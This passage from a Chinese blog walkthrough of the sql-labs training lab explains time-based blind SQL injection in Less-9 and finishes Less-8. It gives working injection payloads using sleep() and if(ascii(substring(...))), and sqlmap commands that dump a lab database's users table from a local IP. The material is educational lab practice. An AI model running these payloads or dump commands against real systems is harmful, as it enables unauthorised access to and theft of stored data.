+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> --dump --threads 10</span><br></pre></td></tr></table></figure>
+<ul>
+<li>–dump 对数据进行爆破</li>
+<li>–threads 10 使用十线程当数据较多时增加线程可以加快速度</li>
+</ul>
+<p><strong>结果：得到数据，第八关结束</strong></p>
+<p><img src="Untitled%20102.png" alt="Untitled"></p>
+<h2 id="Less-9：GET-Blind-Time-based-single-Quotes">Less-9：GET - Blind  Time based - single Quotes</h2>
+<h3 id="界面-9">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%20103.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%20104.png" alt="Untitled"></p>
+<p>我们其实可以知道，当数据库没有一个数据的时候，应当会报错或是页面应该和查到一个数据的时候不同，我们的布尔盲注就是利用如此原理，但此时我们发现无论输入的id正确与否，<strong>页面都未发生改变</strong>，又无回显也没有报错信息，因此此时可以使用<strong>时间盲注</strong></p>
+<h3 id="时间盲注">时间盲注</h3>
+<p>布尔盲注时根据页面的变化作为参照让我们知道我们构造的条件是否正确，而当页面没有变化时，我们仍需要一个参照来确认我们构造的条件是否正确</p>
+<p><strong>用什么作为参照？</strong></p>
+<p>没错，就是<strong>时间</strong>，在sql中有一个函数为**sleep(n)<strong>可以将程序挂起n秒钟，并且搭配</strong>if(1，2，3)，**达到当我们构造的条件为真时，就进行睡眠。为假时就不做操作的效果</p>
+<p><strong>函数及效果</strong></p>
+<ul>
+<li>if(1,2,3)  1处为条件，为真时执行2处语句，为假时执行3处语句</li>
+<li>sleep(n)  将程序挂起n秒钟</li>
+</ul>
+<h3 id="判断注入点-9">判断注入点</h3>
+<p>使用各种符号加上 and sleep(3)—+来判断闭合方式，需要保持and前的条件为真</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：页面挂起将近三秒sleep正确执行，闭合方式为单引号</strong></p>
+<p>页面延迟近3秒</p>
+<p><img src="Untitled%20105.png" alt="Untitled"></p>
+<p>也可以在<code>F12</code>的开发者工具中的<code>网络</code>中看到延迟</p>
+<p><img src="Untitled%20106.png" alt="Untitled"></p>
+<h3 id="关于and和or的使用">关于and和or的使用</h3>
+<p><strong>那么为什么要使用and，而不用or呢？</strong></p>
+<p>在此之前我们需要知道and和or的执行特性</p>
+<p>我们都知道and只有在两边的条件都为真的时候，整体才为真</p>
+<p><strong>那么当第一个条件为假的时候，我们的第二个条件还会执行么？</strong></p>
+<p>我们可以在数据库中验证一下</p>
+<p><strong>payload：如果第一个条件为假变不会执行第二个，那么我们的程序便不会挂起，反之，挂起将近3s</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">false</span> and <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure>
+<p><strong>结果：未挂起，说明在and中第一个条件为假时不会执行第二个，我们可以构造一条第一个条件为真时执行并判断第二个条件的sql语句来验证这个结论</strong></p>
+<p><img src="Untitled%20107.png" alt="Untitled"></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">true</span> and <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure>
+<p><strong>结果：挂起三秒后显示结果，验证了上一个结论，并且说明在and中当第一个条件为真时会继续运行并验证第二个条件</strong></p>
+<p><img src="Untitled%20108.png" alt="Untitled"></p>
+<p><strong>由and的特性来说，最终结果为0，也就是假，说明sleep()的返回值为假</strong></p>
+<p><img src="Untitled%20109.png" alt="Untitled"></p>
+<p><strong>那么，关于or呢？</strong></p>
+<p>我们都知道or是两边任一为真时，整体的结果为真</p>
+<p><strong>那么当第一个结果为真，还会继续执行并判断第二个条件么？</strong></p>
+<p>我们继续在数据库中实验</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">true</span> or <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure>
+<p><strong>结果：并未挂起，说明在or中当第一个条件为真时不会对第二个条件进行执行和判断</strong></p>
+<p><img src="Untitled%20110.png" alt="Untitled"></p>
+<p><strong>我们可以构造一条第一个条件为假时执行并判断第二个条件的sql语句来验证这个结论</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">false</span> or <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure>
+<p><strong>结果：挂起将近三秒，说明在or中若第一个条件为假，则会接着判断第二个条件</strong></p>
+<p><img src="Untitled%20111.png" alt="Untitled"></p>
+<p>那么，<strong>还记得我们最初的问题么？为什么使用and不用or？</strong></p>
+<p>我们试着将一开始的语句换成or试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span> or <span class="built_in">sleep</span>(3)</span><br></pre></td></tr></table></figure>
+<p><strong>结果：挂起将近一分钟</strong></p>
+<p><img src="Untitled%20112.png" alt="Untitled"></p>
+<p>那么为什么会挂起一分钟呢？</p>
+<p>我们分析一下，当查询语句每查到一条数据的时候，按照or的判断规则</p>
+<p>都会先判断第一个条件即</p>
+<p><strong>判断id是否等于1，若不等于就会睡眠3秒，只有当id等于1的时候才不会挂起</strong></p>
+<p><strong>因此当数据库条目很多的时候，则会造成挂起很久的情况。</strong></p>
+<p>因此不建议使用or</p>
+<h3 id="爆破数据库名-8">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(ascii(substring((select database()),1,1))&gt;10,sleep(3),0)--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断出数据库的第一个字符为s，睡眠三秒，后面将使用sqlmap进行演示</strong></p>
+<p><img src="Untitled%20113.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 </span><br></pre></td></tr></table></figure>
+<p><strong>结果：发现时间型盲注</strong></p>
+<p><img src="Untitled%20114.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 --current-db </span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名security</strong></p>
+<p><img src="Untitled%20115.png" alt="Untitled"></p>
+<h3 id="爆破表名-7">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security --tables</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名</strong></p>
+<p><img src="Untitled%20116.png" alt="Untitled"></p>
+<h3 id="爆破字段名-7">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到字段名</strong></p>
+<p><img src="Untitled%20117.png" alt="Untitled"></p>
+<h3 id="爆破数据-7">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security --dump</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据，第九关结束</strong></p>
+<p><img src="Untitled%20118.png" alt="Untitled"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Don Joshua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/">http://example.com/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Don_Joshua's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/01/SYN%20Flood%E6%94%BB%E5%87%BB/" title="SYN Flood攻击"><div class="cover" style="background: transparent"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SYN Flood攻击</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/01/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHMS-1/" title="『vulnhub系列』HMS?-1"><div class="cover" style="background: transparent"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">『vulnhub系列』HMS?-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/06/sql-labs-less-7/" title="sql-labs less-7"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">sql-labs less-7</div></div></a></div><div><a href="/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/" title="墨者在线靶场-SQL注入漏洞测试(参数加密)"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-29</div><div class="title">墨者在线靶场-SQL注入漏洞测试(参数加密)</div></div></a></div><div><a href="/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" title="盲注快速获取数据"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-15</div><div class="title">盲注快速获取数据</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Don Joshua</div><div class="author-info__description">Nothing is true,everything is permitted</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jo4hua"><i class="fab fa-github"></i><span>关注我 不迷路</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:2947127811@qq.com" target="_blank" title="邮箱"><i class="iconfont icon-youjian"></i></a><a class="social-icon" href="tencent://message/?uin=2947127811&amp;Site=Sambow&amp;Menu=yes" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！ 立志成为一名网络安全人员 才疏学浅，文笔拙略 来这里一起见证我的成长吧！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">sql-labs通关笔记(上)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1%EF%BC%9AGET-Error-based-Single-quotes-string"><span class="toc-number">2.1.</span> <span class="toc-text">Less-1：GET -Error based.Single quotes -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2"><span class="toc-number">2.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.5.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.6.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.7.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.8.</span> <span class="toc-text">爆破数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2%EF%BC%9AGET-Error-based-intiger-based"><span class="toc-number">2.2.</span> <span class="toc-text">Less-2：GET -Error based -intiger based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-2"><span class="toc-number">2.2.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="toc-number">2.2.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0-2"><span class="toc-number">2.2.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-2"><span class="toc-number">2.2.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">2.2.5.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D-2"><span class="toc-number">2.2.6.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D-2"><span class="toc-number">2.2.7.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE-2"><span class="toc-number">2.2.8.</span> <span class="toc-text">爆破数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3%EF%BC%9AGET-Error-based-Single-quotes-with-twist-string"><span class="toc-number">2.3.</span> <span class="toc-text">Less-3：GET -Error based -Single quotes with twist -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-3"><span class="toc-number">2.3.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="toc-number">2.3.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0-3"><span class="toc-number">2.3.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-3"><span class="toc-number">2.3.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="toc-number">2.3.5.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D-3"><span class="toc-number">2.3.6.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D-3"><span class="toc-number">2.3.7.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE-3"><span class="toc-number">2.3.8.</span> <span class="toc-text">爆破数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4%EF%BC%9AGET-Error-based-Double-Quotes-string"><span class="toc-number">2.4.</span> <span class="toc-text">Less-4：GET -Error based -Double Quotes -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-4"><span class="toc-number">2.4.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-4"><span class="toc-number">2.4.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0-4"><span class="toc-number">2.4.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-4"><span class="toc-number">2.4.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-4"><span class="toc-number">2.4.5.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D-4"><span class="toc-number">2.4.6.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D-4"><span class="toc-number">2.4.7.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE-4"><span class="toc-number">2.4.8.</span> <span class="toc-text">爆破数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5%EF%BC%9AGET-Double-Injection-single-Quotes-String"><span class="toc-number">3.1.</span> <span class="toc-text">Less-5：GET -Double Injection -single Quotes -String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-5"><span class="toc-number">3.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-5"><span class="toc-number">3.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0-5"><span class="toc-number">3.1.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-5"><span class="toc-number">3.1.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.5.</span> <span class="toc-text">关于报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-5"><span class="toc-number">3.1.6.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D-5"><span class="toc-number">3.1.7.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D-5"><span class="toc-number">3.1.8.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE-5"><span class="toc-number">3.1.9.</span> <span class="toc-text">爆破数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Esubstring"><span class="toc-number">3.1.10.</span> <span class="toc-text">关于substring</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6%EF%BC%9AGET-Double-injection-Double-Quotes-string"><span class="toc-number">3.2.</span> <span class="toc-text">Less-6：GET -Double injection -Double Quotes -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-6"><span class="toc-number">3.2.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-6"><span class="toc-number">3.2.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-6"><span class="toc-number">3.2.3.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D-6"><span class="toc-number">3.2.4.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D-6"><span class="toc-number">3.2.5.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE-6"><span class="toc-number">3.2.6.</span> <span class="toc-text">爆破数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7%EF%BC%9AGET-Dump-into-outfile-string"><span class="toc-number">4.1.</span> <span class="toc-text">Less-7：GET -Dump into outfile -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-7"><span class="toc-number">4.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-7"><span class="toc-number">4.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Einto-outfile"><span class="toc-number">4.1.3.</span> <span class="toc-text">关于into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="toc-number">4.1.4.</span> <span class="toc-text">写入木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%9C%A8%E9%A9%AC"><span class="toc-number">4.1.5.</span> <span class="toc-text">使用蚁剑连接木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.6.</span> <span class="toc-text">将数据写入可访问的文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8%EF%BC%9AGET-Blind-Boolian-Based-single-Quotes"><span class="toc-number">5.1.</span> <span class="toc-text">Less-8：GET -Blind -Boolian Based -single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-8"><span class="toc-number">5.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-8"><span class="toc-number">5.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-7"><span class="toc-number">5.1.3.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Sqlmap%E8%BF%9B%E8%A1%8CGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.4.</span> <span class="toc-text">使用Sqlmap进行GET类型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Sqlmap%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">5.1.5.</span> <span class="toc-text">使用Sqlmap爆破数据库名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Sqlmap%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="toc-number">5.1.6.</span> <span class="toc-text">使用Sqlmap爆破表名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Sqlmap%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span class="toc-number">5.1.7.</span> <span class="toc-text">使用Sqlmap爆破字段名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Sqlmap%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE"><span class="toc-number">5.1.8.</span> <span class="toc-text">使用Sqlmap爆破数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9%EF%BC%9AGET-Blind-Time-based-single-Quotes"><span class="toc-number">5.2.</span> <span class="toc-text">Less-9：GET - Blind  Time based - single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a 